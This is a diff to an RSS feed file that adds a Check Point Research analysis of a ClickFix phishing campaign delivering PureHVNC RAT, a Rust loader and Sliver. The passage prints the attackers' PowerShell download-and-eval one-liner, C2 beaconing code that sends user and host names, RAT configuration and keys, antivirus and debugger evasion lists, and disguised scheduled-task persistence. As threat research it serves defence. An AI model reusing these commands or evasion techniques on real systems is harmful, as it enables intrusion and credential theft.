@@ -1,5 +1,969 @@
 <?xml version='1.0' encoding='UTF-8'?>
-<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>RedKey RSS Feed</title><link>https://redkey.tech/feed.xml</link><description>All The Cyber Things.</description><atom:link href="https://redkey.tech/feed.xml" rel="self"/><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><language>en</language><lastBuildDate>Tue, 16 Sep 2025 11:59:17 +0000</lastBuildDate><item><title>Infocon: green</title><link>https://isc.sans.edu/diary.html?rss</link><description>ISC Stormcast For Tuesday, September 16th, 2025 https://isc.sans.edu/podcastdetail/9614</description><guid isPermaLink="false">https://isc.sans.edu/diary.html?rss</guid></item><item><title>Upcoming Speaking Engagements</title><link>https://www.schneier.com/blog/archives/2025/09/upcoming-speaking-engagements-48.html</link><description>&lt;p&gt;This is a current list of where and when I am scheduled to speak:&lt;/p&gt;
+<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>RedKey RSS Feed</title><link>https://redkey.tech/feed.xml</link><description>All The Cyber Things.</description><atom:link href="https://redkey.tech/feed.xml" rel="self"/><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><language>en</language><lastBuildDate>Tue, 16 Sep 2025 13:00:29 +0000</lastBuildDate><item><title>Under the Pure Curtain: From RAT to Builder to Coder</title><link>https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/</link><description>&lt;p&gt;Research by:&amp;#160;Antonis Terefos (@Tera0017) Key Points Introduction The&amp;#160;Pure malware family&amp;#160;is a suite of malicious tools developed and sold by the author known as&amp;#160;PureCoder. This suite includes&amp;#160;PureHVNC RAT&amp;#160;(a remote administration tool and predecessor to&amp;#160;PureRAT),&amp;#160;PureCrypter&amp;#160;(a malware obfuscator),&amp;#160;PureLogs&amp;#160;(a stealer/logger), and several other tools. The malicious software is advertised and distributed through underground forums, Telegram channels, and dedicated websites. [&amp;#8230;]&lt;/p&gt;
+&lt;p&gt;The post &lt;a href="https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/"&gt;Under the Pure Curtain: From RAT to Builder to Coder&lt;/a&gt; appeared first on &lt;a href="https://research.checkpoint.com"&gt;Check Point Research&lt;/a&gt;.&lt;/p&gt;</description><content:encoded>&lt;p&gt;&lt;strong&gt;Research by:&lt;/strong&gt;&amp;nbsp;Antonis Terefos (&lt;a href="https://x.com/Tera0017"&gt;&lt;strong&gt;@Tera0017&lt;/strong&gt;&lt;/a&gt;)&lt;/p&gt;
+
+
+
+&lt;h2 class="wp-block-heading" id="key-points"&gt;Key Points&lt;/h2&gt;
+
+
+
+&lt;ul class="wp-block-list"&gt;
+&lt;li&gt;Check Point Research conducted a forensic analysis of a&amp;nbsp;&lt;strong&gt;ClickFix&lt;/strong&gt;&amp;nbsp;campaign that lured victims with fake job offers that resulted in an&amp;nbsp;&lt;strong&gt;eight-day intrusion.&lt;/strong&gt;&amp;nbsp;The threat actor deployed multiple tools, including a&amp;nbsp;&lt;strong&gt;Rust Loader&lt;/strong&gt;,&amp;nbsp;&lt;strong&gt;PureHVNC RAT&lt;/strong&gt;, and the&amp;nbsp;&lt;strong&gt;Sliver&lt;/strong&gt;&amp;nbsp;command-and-control framework.&lt;/li&gt;
+
+
+
+&lt;li&gt;In this publication, we analyzed the associated files, providing one of the most comprehensive analyses of&amp;nbsp;&lt;strong&gt;PureHVNC RAT&lt;/strong&gt;, including its complete set of commands and plugins.&lt;/li&gt;
+
+
+
+&lt;li&gt;During communication with the command and control server, the bot received three&amp;nbsp;&lt;strong&gt;GitHub&lt;/strong&gt;&amp;nbsp;URLs containing supporting files for specific PureHVNC functionalities. Analysis confirmed that both the URLs and the associated GitHub accounts were directly linked to the&amp;nbsp;&lt;strong&gt;developer&lt;/strong&gt;&amp;nbsp;of the Pure malware family.&lt;/li&gt;
+
+
+
+&lt;li&gt;Where previously little to no information was known about&amp;nbsp;&lt;em&gt;&lt;strong&gt;PureCoder&lt;/strong&gt;&lt;/em&gt;, this publication sheds light on the developer’s&amp;nbsp;&lt;strong&gt;timezone of operation (UTC+0300)&lt;/strong&gt;&amp;nbsp;and potential countries of residence. This lead may enable further intelligence gathering by relevant agencies.&lt;/li&gt;
+
+
+
+&lt;li&gt;Further investigation led to the discovery of a&amp;nbsp;&lt;strong&gt;PureRAT builder&lt;/strong&gt;, revealing insights into the RAT’s capabilities and highlighting features linked to&amp;nbsp;&lt;strong&gt;PureCrypter&lt;/strong&gt;, another tool developed by&amp;nbsp;&lt;em&gt;&lt;strong&gt;PureCoder&lt;/strong&gt;&lt;/em&gt;, the author behind the Pure malware suite.&lt;/li&gt;
+&lt;/ul&gt;
+
+
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+
+
+&lt;h2 class="wp-block-heading" id="introduction"&gt;Introduction&lt;/h2&gt;
+
+
+
+&lt;p&gt;The&amp;nbsp;&lt;strong&gt;Pure malware family&lt;/strong&gt;&amp;nbsp;is a suite of malicious tools developed and sold by the author known as&amp;nbsp;&lt;em&gt;&lt;strong&gt;PureCoder&lt;/strong&gt;&lt;/em&gt;. This suite includes&amp;nbsp;&lt;strong&gt;PureHVNC RAT&lt;/strong&gt;&amp;nbsp;(a remote administration tool and predecessor to&amp;nbsp;&lt;strong&gt;PureRAT&lt;/strong&gt;),&amp;nbsp;&lt;strong&gt;PureCrypter&lt;/strong&gt;&amp;nbsp;(a malware obfuscator),&amp;nbsp;&lt;strong&gt;PureLogs&lt;/strong&gt;&amp;nbsp;(a stealer/logger), and several other tools. The malicious software is advertised and distributed through underground forums, Telegram channels, and dedicated websites. These products are often combined to maximize their effectiveness across a wide range of malicious operations.&lt;/p&gt;
+
+
+
+&lt;p&gt;While&amp;nbsp;&lt;strong&gt;PureCoder&lt;/strong&gt;&amp;nbsp;is responsible for building and maintaining the malware ecosystem, cybercriminal customers primarily use these tools to conduct campaigns. In 2025, there has been a noticeable increase in the use of Pure malware products, with threat actors distributing them through various methods, including malspam, phishing websites, and the ClickFix technique.&lt;/p&gt;
+
+
+
+&lt;p&gt;During a Check Point Incident Response (IR) engagement, our team investigated and contained an eight-day intrusion. The threat actor distributed a Rust loader, which deployed&amp;nbsp;&lt;strong&gt;PureHVNC RAT&lt;/strong&gt;&amp;nbsp;with campaign IDs&amp;nbsp;&lt;code&gt;2a&lt;/code&gt;&amp;nbsp;and&amp;nbsp;&lt;code&gt;amazon3&lt;/code&gt;. The attacker lured the victim through fake job advertisements, allowing the attacker to execute malicious PowerShell code through the ClickFix phishing technique.&lt;/p&gt;
+
+
+
+&lt;p&gt;The RAT’s Command and Control Server (C&amp;amp;C) has been observed to deliver three GitHub URLs to infected victims and download the related files. These downloaded files support various commands used by&amp;nbsp;&lt;strong&gt;PureHVNC RAT&lt;/strong&gt;&amp;nbsp;and were determined to be part of the Pure development and operation infrastructure rather than the threat actor itself. As a result, the GitHub accounts involved were attributed to the developer of Pure malware families,&amp;nbsp;&lt;strong&gt;PureCoder&lt;/strong&gt;.&lt;/p&gt;
+
+
+
+&lt;p&gt;While limited information is currently available about the author of these products, analysis of the associated GitHub accounts revealed a timezone of operation set to&amp;nbsp;&lt;code&gt;UTC+0300&lt;/code&gt;, which corresponds to several countries, including Russia.&lt;/p&gt;
+
+
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+
+
+&lt;h2 class="wp-block-heading" id="clickfix-campaign-forensics-artifacts"&gt;ClickFix Campaign &amp;amp; Forensics Artifacts&lt;/h2&gt;
+
+
+
+&lt;p&gt;&lt;strong&gt;ClickFix&lt;/strong&gt;&amp;nbsp;is a social engineering phishing technique in which victims are presented with deceptive instructions designed to trick them into running a malicious command. In this campaign, the victim was lured to the ClickFix phishing page through fake job offers. Upon visiting the page, a&amp;nbsp;&lt;strong&gt;PowerShell&lt;/strong&gt;&amp;nbsp;command was automatically copied to their clipboard, delivering a malicious JavaScript file.&lt;/p&gt;
+
+
+
+&lt;p&gt;During the eight-day intrusion, the attacker used&amp;nbsp;&lt;strong&gt;malicious JavaScript files&lt;/strong&gt;, deployed&amp;nbsp;&lt;strong&gt;two instances of PureHVNC RAT&lt;/strong&gt;, established persistence on the victim’s system, and finally executed the&amp;nbsp;&lt;strong&gt;Sliver&lt;/strong&gt;&amp;nbsp;Command and Control (C2) framework.&lt;/p&gt;
+
+
+&lt;div class="wp-block-image is-style-default"&gt;
+&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-31854" height="685" src="https://research.checkpoint.com/wp-content/uploads/2025/09/Screenshot_2025-08-08_185650.png" width="948" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 1 — Infection Chain.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;
+
+
+&lt;h3 class="wp-block-heading" id="infection-day-1---clickfix-purehvnc"&gt;Infection Day 1 &amp;#8211; ClickFix &amp;amp; PureHVNC&lt;/h3&gt;
+
+
+
+&lt;p&gt;During the first moments of the initial access, we observe the majority of interaction from the threat actor dropping JavaScript files and the first version of PureHVNC RAT.&lt;/p&gt;
+
+
+
+&lt;p&gt;The victim was lured through fake job offers, and upon visiting the malicious&amp;nbsp;&lt;strong&gt;ClickFix&lt;/strong&gt;&amp;nbsp;website, a&amp;nbsp;&lt;strong&gt;PowerShell&lt;/strong&gt;&amp;nbsp;command was automatically copied to their clipboard.&lt;/p&gt;
+
+
+&lt;div class="wp-block-image"&gt;
+&lt;figure class="aligncenter size-full is-resized"&gt;&lt;img alt="" class="wp-image-31856" height="485" src="https://research.checkpoint.com/wp-content/uploads/2025/09/Screenshot_2025-08-05_130112.png" style="width: 591px; height: auto;" width="879" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 2 — ClickFix prompt.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;
+
+
+&lt;p&gt;The page instructed the user to paste and execute the command. If executed, the command downloaded and ran a&amp;nbsp;&lt;strong&gt;malicious JavaScript file&lt;/strong&gt;, initiating the infection chain.&lt;/p&gt;
+
+
+
+&lt;p&gt;Copied PowerShell command:&lt;/p&gt;
+
+
+
+&lt;pre class="EnlighterJSRAW"&gt;powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new 
+ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr&lt;/pre&gt;
+
+
+
+&lt;p&gt;The command and control server responded with malicious JavaScript code, which created a malicious LNK file in the Startup Folder and granted itself persistence to the machine. The malicious JavaScript file is obfuscated, and each day, it contacts a different command and control server and waits for further instructions.&lt;/p&gt;
+
+
+
+&lt;pre class="EnlighterJSRAW"&gt;function getURL() {
+    var C2_domain_list = ['stathub[.]quest', 'stategiq[.]quest', 'mktblend[.]monster', 'dsgnfwd[.]xyz', 'dndhub[.]xyz'];
+    var current_datetime = new Date().getTime();
+    var no_days = getDaysDiff(0, current_datetime);
+    return 'https://'
+        + getListElement(C2_domain_list, no_days)
+        + '/Y/?t=' + current_datetime
+        + '&amp;amp;v=5&amp;amp;p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
+}&lt;/pre&gt;
+
+
+
+&lt;p&gt;The JavaScript delivers the first version of PureHVNC RAT with command and control&amp;nbsp;&lt;code&gt;54[.]197.141.245&lt;/code&gt;&amp;nbsp;and campaign ID&amp;nbsp;&lt;code&gt;2a&lt;/code&gt;.&lt;/p&gt;
+
+
+
+&lt;h3 class="wp-block-heading" id="infection-day-2---rust-loader-purehvnc"&gt;Infection Day 2 &amp;#8211; Rust Loader &amp;amp; PureHVNC&lt;/h3&gt;
+
+
+
+&lt;p&gt;During the second day of the infection, the threat actor deployed a newer version of PureHVNC RAT packed with a Rust Loader and&amp;nbsp;&lt;strong&gt;Inno Setup,&lt;/strong&gt;&amp;nbsp;an open-source installation builder for Windows applications.&lt;/p&gt;
+
+
+
+&lt;p&gt;This Rust Loader that deploys PureHVNC RAT is dropped in&amp;nbsp;&lt;code&gt;%APPDATA%\Microsoft\SystemCertificates\9TwinAPIInterop.pfx&lt;/code&gt;&amp;nbsp;and contains no differences with the first version, the only change appears to be the campaign ID&amp;nbsp;&lt;code&gt;amazon3&lt;/code&gt;.&lt;/p&gt;
+
+
+
+&lt;p&gt;PureHVNC RAT Configuration:&lt;/p&gt;
+
+
+
+&lt;pre class="EnlighterJSRAW"&gt;{
+  "C&amp;amp;C": "54.197.141.245",
+  "ports": [443, 10443],
+  "certificate": "MIIE4jCCAsqgAwIBAgIQAPKOllxpzWEf7Cig2iwQUTANBgkqhkiG9w0BAQ0FADASMRAwDgYDVQQDDAdXd2ZwaHZiMCAXDTI0MDkxNTEyNDUwN1oYDzk5OTkxMjMxMjM1OTU5WjASMRAwDgYDVQQDDAdXd2ZwaHZiMIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEA3Qm+O4ZX8e7qnzb7AcS+MKuMmNan06HgF1tV3zC92tiL/QylCy3TfZ1GQmut+cOfuZby9uYAyMF74uxtwpFpr6pzL4ps3HxpuxBrvAcRsUKVShpQzGOTMwlJWJj7nDX1Tn/PIr9g55C7jTF/k93grdGN38EAYQSd75gxhZ7sddCZFuBy6Bdt21URknipN9N3y/dlDO+qBZmbVhGGEqZ1HrVD2RpmKKEO6OZu4XJHLrn1EsjgxyM0ifb7P38bR/cDB2PxzOqGRZ/Snhg5Bw/uG82+twYkp6CxVRH59yamlHp9qRF4vRFLk08xZ0+lRkQV4BrEWbA60omIp3XDdnMOPFZnqHUMTBTZ871LE782VF34xM5QdIA2r6QjqNyKSymb/lMcLJEhlJ+DEf05Y20lE9nJTn/ioMKO/ilszJOhu8NS43g+torPCEOvDldBfxtgcp4w+SXXLfUi3+p/326JXghRpqZUQ99VaH/ucT4rP9CcSjIqlCymPuAhOZmRDyMAcWuzsz/1STgZ8fxP0DVprdpTLvN9n+esMPYHRECUlaZLdn9x9AmZARbMatOdAzH8LgQTG02ecVS/pEugUVg7Ipxn6pWqjK+NSFNr1kxCYI5UqZK50CdINoKM8+frA7gAl3ohnY4bRK6bFioaCCcCZJF7FaJJh+EDs/CQ6KcLpnkCAwEAAaMyMDAwHQYDVR0OBBYEFB9jTlNea5ZsJd7ClDh/cepkFXZZMA8GA1UdEwEB/wQFMAMBAf8wDQYJKoZIhvcNAQENBQADggIBAH3nFnvuPEufM3BwPNfhgs5RkPPXk2pG9cTznxER3h37kR3jguEnq2wL7yYA2D30XA8tJv7+CPZ/IrtSC0OSyEmw8a5FoHtno22e5Dtq81FY4c8kFTS0p39mtAEtitAGehMyE6K3X0LgvNaxWwbdL9rcko62msxqKRw3fxaFjTNK+tl5H6T8jXH5VMqEd0eiiK5ySanLkiy+CfYJnyqBoICYW4r1W/o65ibgxzPoOzcbod4UG9O6YwDqMDN8JlQDQTl7gZLitCRcaBZQynINF2yZwZYirdWqK0X3fhQLluoZ9zXhc5rb3UM5+QvP9p/ZaUOIZ0m18vjVcnz6Zo9N60K93u5Z/IzBcd8gM1Wp3dtDruekbjdXs8b+txMDFSy56ZPBFLJhWO4xpGt172ZMp6Du9sMAWDaDTfPvZWprE5WjCk4fltMQU0DGbPmP1il3XLtqVvPiLvuAccrbL9wkvlvDKgjqUpYjXsdFOT5unXiYc1eEDW4HIWNJcIw2J4oz8I2AlwQ+exVTEArQc8G3fNbMsvZD7CtSVJKqZLSkAfoki3Zrs/fIFTGGNzQ/Vbb01K7k7s2mAQ4Mr1JjNh/ZwlTdubKZp+jbARrhDvvdPISupSo0KDKBjwkY2tcGw/aTsYKdNywDn8VqIvLjHhDKG4vMm7FYoLMdEWIXNyvP1oJ2",
+  "campaign_id": "amazon3",
+  "install_path": "APPDATA",
+  "mutex": "aa05be285061"
+}&lt;/pre&gt;
+
+
+
+&lt;h3 class="wp-block-heading" id="infection-day-8---sliver-implant"&gt;Infection Day 8 &amp;#8211; Sliver Implant&lt;/h3&gt;
+
+
+
+&lt;p&gt;After mostly staying inactive for more than six days, possibly to verify that the infected machine is a real target rather than a sandbox environment, the threat actor delivered a Sliver implant with C&amp;amp;C&amp;nbsp;&lt;code&gt;hxxps://jq-scripts.global.ssl[.]fastly[.]net&lt;/code&gt;. Sliver then delivered and executed a PowerShell Script that requested the user’s password in a prompt and stored the credentials at&amp;nbsp;&lt;code&gt;%ProgramData%/&amp;lt;domain&amp;gt;_&amp;lt;username&amp;gt;_cred.txt&lt;/code&gt;.&lt;/p&gt;
+
+
+&lt;div class="wp-block-image"&gt;
+&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-31858" height="265" src="https://research.checkpoint.com/wp-content/uploads/2025/09/Screenshot_2025-08-13_155727.png" width="462" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 3 — PowerShell User-Credential Theft Script.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;
+
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+
+
+&lt;h2 class="wp-block-heading" id="rust-loader---technical-analysis"&gt;Rust Loader &amp;#8211; Technical Analysis&lt;/h2&gt;
+
+
+
+&lt;p&gt;The malicious loader is a DLL file developed in Rust programming language and is executed using&amp;nbsp;&lt;a href="https://lolbas-project.github.io/"&gt;LOLBin&lt;/a&gt;&amp;nbsp;regsvr32. The malicious functionality lies in the function exports&amp;nbsp;&lt;code&gt;DllRegisterServer&lt;/code&gt;&amp;nbsp;and&amp;nbsp;&lt;code&gt;DllUnregisterServer&lt;/code&gt;, which contains the same piece of code.&lt;/p&gt;
+
+
+
+&lt;h3 class="wp-block-heading" id="string-decryption"&gt;String Decryption&lt;/h3&gt;
+
+
+
+&lt;p&gt;The malware contains encrypted strings that are decrypted on demand using the&amp;nbsp;&lt;strong&gt;ChaCha20-Poly1305&lt;/strong&gt;&amp;nbsp;algorithm. The decryption key is generated by the XOR of two hardcoded values embedded in the binary:&lt;/p&gt;
+
+
+
+&lt;pre class="EnlighterJSRAW"&gt;Value 1: 4a01d45563d802fee5593a21f1b216aeed83c4dff50fa6a31391ff73feb29dbd
+Value 2: bf83184822bf184536b50dff4758edd638b59cb82a06ee019b62b0bce33d07b5
+Chacha20-Poly1305 Key: f582cc1d41671abbd3ec37deb6eafb78d5365867df0948a288f34fcf1d8f9a08&lt;/pre&gt;
+
+
+
+&lt;h3 class="wp-block-heading" id="anti-analysis-techniques"&gt;Anti-analysis Techniques&lt;/h3&gt;
+
+
+
+&lt;p&gt;The first anti-analysis techniques monitor the running processes and try to identify various processes related to antivirus and security software, debuggers, reverse engineering tools and monitoring tools. The malware detected antivirus processes from Bitdefender, ESET, Kaspersky, Ad-Aware, and 360 Total Security.&lt;/p&gt;
+
+
+
+&lt;p&gt;Blacklisted processes:&lt;/p&gt;
+
+
+
+&lt;pre class="EnlighterJSRAW"&gt;"bdservicehost.exe", "bdredline.exe", "aylaunch.exe", "egui.exe", "360Safe.exe", "zhudongfangyu.exe", "HipsDaemon.exe", "ekrn.exe", "eguiProxy.exe", "avp32.exe", "avpcc.exe", "avpm.exe", "avpdos32.exe", "avp.exe", "adawareservice.exe", "ksdumper.exe", "decoder.exe", "dnspy.exe", "dbgx.shell.exe", "ilspy.exe", "ollydbg.exe", "x32dbg.exe", "x64dbg.exe", "gdb.exe", "idaq.exe", "idag.exe", "idaw.exe", "ida64.exe", "idag64.exe", "idaw64.exe", "idaq64.exe", "windbg.exe", "immunitydebugger.exe", "windasm.exe", "scylla.exe", "scyllahide.exe", "cheatengine.exe", "pe-bear.exe", "ollyice.exe", "radare2.exe", "ghidra.exe", "sysanalyzer.exe", "xperf.exe", "procdump.exe", "dbgview.exe", "apimonitor.exe", "pe-sieve64.exe", "pe-sieve32.exe", "pe-moneta.exe"&lt;/pre&gt;
+
+
+
+&lt;p&gt;The second anti-analysis technique includes a list of API functions specifically present in Microsoft’s Windows Defender Malware Analysis Emulator. This technique addresses the differences between the Windows libraries and the virtual ones, which contain more API calls specifically related to the emulated environment.&lt;/p&gt;
+
+
+
+&lt;p&gt;Blacklisted APIs:&lt;/p&gt;
+
+
+
+&lt;pre class="EnlighterJSRAW"&gt;"MpVmp32Entry", "NtControlChannel", "ObjMgr_ValidateVFSHandle", "ThrdMgr_GetCurrentThreadHandle", "ThrdMgr_SaveTEB", "ThrdMgr_SwitchThreads", "VFS_CopyFile", "VFS_DeleteFile", "VFS_DeleteFileByHandle", "VFS_FileExists", "VFS_FindClose", "VFS_FindFirstFile", "VFS_FindNextFile", "VFS_FlushViewOfFile", "VFS_GetAttrib", "VFS_GetHandle", "VFS_GetLength", "VFS_MapViewOfFile", "VFS_MoveFile", "VFS_Open", "VFS_Read", "VFS_SetAttrib", "VFS_SetCurrentDir", "VFS_SetLength", "VFS_UnmapViewOfFile", "VFS_Write", "MpAddToScanQueue", "MpCreateMemoryAliasing", "MpCallPostEntryPointCode", "MpCallPreEntryPointCode", "MpDispatchException", "MpExitThread", "MpFinalize", "MpGetCurrentThreadHandle", "MpGetCurrentThreadId", "MpGetLastSwitchResult", "MpGetPseudoThreadHandle", "MpGetSelectorBase", "MpGetVStoreFileHandle", "MpHandlerCodePost", "MpIntHandler", "MpIntHandlerParam", "MpIntHandlerReturnAddress", "MpNtdllDatatSection", "MpReportEvent", "MpReportEventEx", "MpReportEventW", "MpSehHandler", "MpSetSelectorBase", "MpStartProcess", "MpSwitchToNextThread", "MpSwitchToNextThread_WithCheck", "MpSwitchToNextThread_NewObjManager", "MpTimerEvent", "MpTimerEventData", "MpUfsMetadataOp", "MpValidateVFSHandle", "MpVmp32FastEnter"&lt;/pre&gt;
+
+
+
+&lt;p&gt;If any of those anti-analysis techniques detects that the malware is being analyzed and monitored under an emulated or sandbox environment, it will sleep for a random time between 10 to 30 minutes, by executing the command&amp;nbsp;&lt;code&gt;cmd /c timeout /t {random_time} &amp;gt;null&lt;/code&gt;, once awake, if still running in the monitored environment, it reruns the anti-analysis process, and if it is again detected, it falls into a random sleep again.&lt;/p&gt;
+
+
+
+&lt;p&gt;The Rust Loader requires that it be executed with a specific command line parameter that, if it is not present, terminates its execution. The malware retrieves the parameters passed to the process and tries to find the parameter&amp;nbsp;&lt;code&gt;/i:--type=renderer&lt;/code&gt;.&lt;/p&gt;
+
+
+
+&lt;p&gt;As a final anti-analysis and evasion technique, immediately following the successful decryption of its payload, the malware actively implements an AMSI bypass by injecting a hook into the native&amp;nbsp;&lt;code&gt;LdrLoadDll&lt;/code&gt;&amp;nbsp;function within&amp;nbsp;&lt;code&gt;ntdll.dll&lt;/code&gt;. This hook intercepts attempts to load the&amp;nbsp;&lt;code&gt;amsi.dll&lt;/code&gt;&amp;nbsp;library—responsible for the Windows Anti-malware Scan Interface—and effectively prevents it from being loaded into the process. By doing so, the malware disables AMSI’s runtime scanning capabilities, thereby evading detection and analysis by security products that rely on AMSI for real-time malware inspection.&lt;/p&gt;
+
+
+&lt;div class="wp-block-image"&gt;
+&lt;figure class="aligncenter size-full is-resized"&gt;&lt;img alt="" class="wp-image-31859" height="246" src="https://research.checkpoint.com/wp-content/uploads/2025/09/Screenshot_2025-07-03_115405.png" style="width: 686px; height: auto;" width="734" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 4 — LdrLoadDll Hooked function.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;
+
+
+&lt;h3 class="wp-block-heading" id="persistence"&gt;Persistence&lt;/h3&gt;
+
+
+
+&lt;p&gt;The malware checks if the process is not running with administrative privileges, then executes the PowerShell command below to grant the malware higher privileges.&lt;/p&gt;
+
+
+
+&lt;pre class="EnlighterJSRAW"&gt;"powershell" -Command "
+while ($true) {
+    try {
+        Start-Process -FilePath 'cmd.exe' `
+            -Verb runas `
+            -ArgumentList '/c start "" /B "regsvr32.exe" {MALWARE} /i:--type=renderer';
+        exit
+    } catch {}
+}
+"&lt;/pre&gt;
+
+
+
+&lt;p&gt;This PowerShell will try to execute the malicious DLL with administrative privileges in an infinite loop until the User accepts the UAC (User Account Control) prompt. Once the prompt is accepted, the process terminates itself, and the infection continues with the one that obtained higher privileges.&lt;/p&gt;
+
+
+
+&lt;p&gt;The loader, to avoid being executed twice, creates a Mutex&amp;nbsp;&lt;code&gt;MistyRoseNavy&lt;/code&gt;&amp;nbsp;and then executes a PowerShell command, which will maintain persistence to the system via scheduled tasks.&lt;/p&gt;
+
+
+
+&lt;p&gt;The first PowerShell command will try to see if any Scheduled Task is already registered in the system.&lt;/p&gt;
+
+
+
+&lt;pre class="EnlighterJSRAW"&gt;"powershell" -Command "
+if (
+    Get-ScheduledTask | Where-Object {
+        $_.Actions.Execute -eq 'regsvr32' -and
+        $_.Actions.Arguments -eq '/s /i:--type=renderer \"%APPDATA%\Microsoft\SystemCertificates\{MALWARE}\"'
+    }
+) {
+    exit 0
+} else {
+    exit 1
+}
+"&lt;/pre&gt;
+
+
+
+&lt;p&gt;If not, it will proceed to create persistence on the infected machine. The Task name and path were made to mimic a Google Updater:&lt;/p&gt;
+
+
+
+&lt;pre class="EnlighterJSRAW"&gt;Register-ScheduledTask `
+  -Action (
+    New-ScheduledTaskAction `
+      -Execute "regsvr32" `
+      -Argument "/s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\{MALWARE}""
+  ) `
+  -Trigger (
+    New-ScheduledTaskTrigger `
+      -Once -At (Get-Date).AddMinutes(1) `
+      -RepetitionInterval (New-TimeSpan -Minutes 1)
+  ) `
+  -TaskName 'GoogleUpdaterTaskSystem196.6.2928.90.{FD10B0DF-9A2C-41C2-B9E7-3C3C6F193A83}' `
+  -TaskPath '\GoogleSystem\GoogleUpdater' `
+  -Description 'GoogleUpdater Task System 196.6.2928.90' `
+  -Settings (
+    New-ScheduledTaskSettingsSet `
+      -AllowStartIfOnBatteries `
+      -DontStopIfGoingOnBatteries `
+      -ExecutionTimeLimit 0 `
+      -DontStopOnIdleEnd
+  ) `
+  -RunLevel Highest&lt;/pre&gt;
+
+
+
+&lt;p&gt;The execution of the above script will be performed by running it as a&amp;nbsp;&lt;strong&gt;PowerShell over stdin&lt;/strong&gt;, executing first the below command and writing into a Pipe&amp;nbsp;&lt;code&gt;WriteFileEx&lt;/code&gt;&amp;nbsp;the persistence PowerShell script.&lt;/p&gt;
+
+
+
+&lt;pre class="EnlighterJSRAW"&gt;PowerShell.exe -NoProfile -NonInteractive -Command -&lt;/pre&gt;
+
+
+
+&lt;h3 class="wp-block-heading" id="payload-decryption-execution"&gt;Payload Decryption &amp;amp; Execution&lt;/h3&gt;
+
+
+
+&lt;p&gt;The payload is embedded inside the Rust binary and is decrypted using a simple XOR with a 32-byte key.&lt;/p&gt;
+
+
+&lt;div class="wp-block-image"&gt;
+&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-31861" height="211" src="https://research.checkpoint.com/wp-content/uploads/2025/09/Screenshot_2025-07-03_095131.png" width="647" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 5 — Payload decryption routine.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Later, the malware will validate the decrypted value, which will determine the next step. The validation occurs by XORing the decrypted bytes and generating a hash value.&lt;/p&gt;
+
+
+&lt;div class="wp-block-image"&gt;
+&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-31862" height="253" src="https://research.checkpoint.com/wp-content/uploads/2025/09/Screenshot_2025-07-03_102654.png" width="715" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 6 — Hash generation.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;
+
+
+&lt;p&gt;This hash value is further processed and compared with the value 0x6. During this function, we also observe the hexadecimal value&amp;nbsp;&lt;code&gt;0xDEADBEEF&lt;/code&gt;&amp;nbsp;even though it does not affect the output, which appears to be used solely as a marker.&lt;/p&gt;
+
+
+&lt;div class="wp-block-image"&gt;
+&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-31863" height="321" src="https://research.checkpoint.com/wp-content/uploads/2025/09/Screenshot_2025-07-03_103033.png" width="373" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 7 — Hash validation.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;
+
+
+&lt;p&gt;The next step, the malware checks if the decrypted payload is bigger than 1 KB (1024 Bytes), and only if so, proceeds further with the infection, otherwise, it terminates itself. At this stage, the malware has already hooked&amp;nbsp;&lt;code&gt;LdrLoadDll&lt;/code&gt;&amp;nbsp;successfully bypasses AMSI loading.&lt;/p&gt;
+
+
+&lt;div class="wp-block-image"&gt;
+&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-31864" height="196" src="https://research.checkpoint.com/wp-content/uploads/2025/09/Screenshot_2025-07-03_105332.png" width="591" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 8 — Size check.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;
+
+
+&lt;p&gt;As the last step, the Rust Loader creates a heap, copies the decrypted payload buffer into it, and executes the shellcode.&lt;/p&gt;
+
+
+&lt;div class="wp-block-image"&gt;
+&lt;figure class="aligncenter size-full is-resized"&gt;&lt;img alt="" class="wp-image-31865" height="286" src="https://research.checkpoint.com/wp-content/uploads/2025/09/Screenshot_2025-07-03_120207.png" style="width: 806px; height: auto;" width="855" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 9 — Shellcode NOP and CALL instruction.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;
+
+
